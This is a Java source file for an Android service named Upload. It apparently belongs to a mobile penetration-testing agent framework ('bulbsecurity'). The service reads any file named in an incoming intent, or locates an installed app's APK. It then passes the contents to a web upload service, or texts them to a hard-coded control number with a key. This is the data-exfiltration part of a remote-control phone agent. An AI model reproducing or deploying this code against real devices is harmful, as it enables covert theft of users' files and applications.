package com.bulbsecurity.framework;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import android.util.Log;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;

public class Upload extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	public void onStart(Intent intent, int startID) {
		Log.i("AAA", "Upload");
		String sms = "SMS";
		String web = "WEB";
		//String ret = intent.getStringExtra("returnmethod");
		String ret = "WEB";
		String file = intent.getStringExtra("file");
		String app = intent.getStringExtra("app");
		String apk = "none";
		String text = "";
		if (app.equals("no"))
				{
		
			File file2 = new File(file);
		try {
		    BufferedReader br = new BufferedReader(new FileReader(file));
		    String line;

		    while ((line = br.readLine()) != null) {
		        text = text.concat(line);
		        text = text.concat("\n");
		    }
		}
		catch (Exception e) {
		    //You'll need to add proper error handling here
		}
				}
		else if (app.equals("yes"))
		{
			try {
				Log.i("AAA", file);
			PackageManager pm = getPackageManager();
			ApplicationInfo info = pm.getApplicationInfo(file, 0);
			String location = info.sourceDir;
			text = "apk to upload";
			apk = location;
			Log.i("AAA", location);
			}
			catch (Exception e) {
			    //You'll need to add proper error handling here
			}
			
		}
			if (ret != null)
			{
				 
				if (ret.equals(sms))
				{

			        
					Intent intent3 = new Intent(getApplicationContext(),SMSService.class);
					//String number2 = ((AndroidAgent)this.getApplication()).getcontrolNumber();
					//String key = ((AndroidAgent)this.getApplication()).getkey();
					String key = getApplicationContext().getResources().getString(R.string.key);
					String number2 = getApplicationContext().getResources().getString(R.string.controlnumber);
					String first = key.concat(" ");
					String smsss = first.concat(text);
					intent3.putExtra("number", number2);
					intent3.putExtra("message", smsss);
					Context context = getApplicationContext();
					context.startService(intent3);
					
				}
				else if (ret.equals(web))
				{
   					Log.i("AAA", "webupload");

					Intent intent2 = new Intent(getApplicationContext(), WebUploadService.class);
					intent2.putExtra("uploadstring", text);
					intent2.putExtra("app",apk );
					Context context = getApplicationContext();
					context.startService(intent2);
				}
				
			}
		}
	

	}




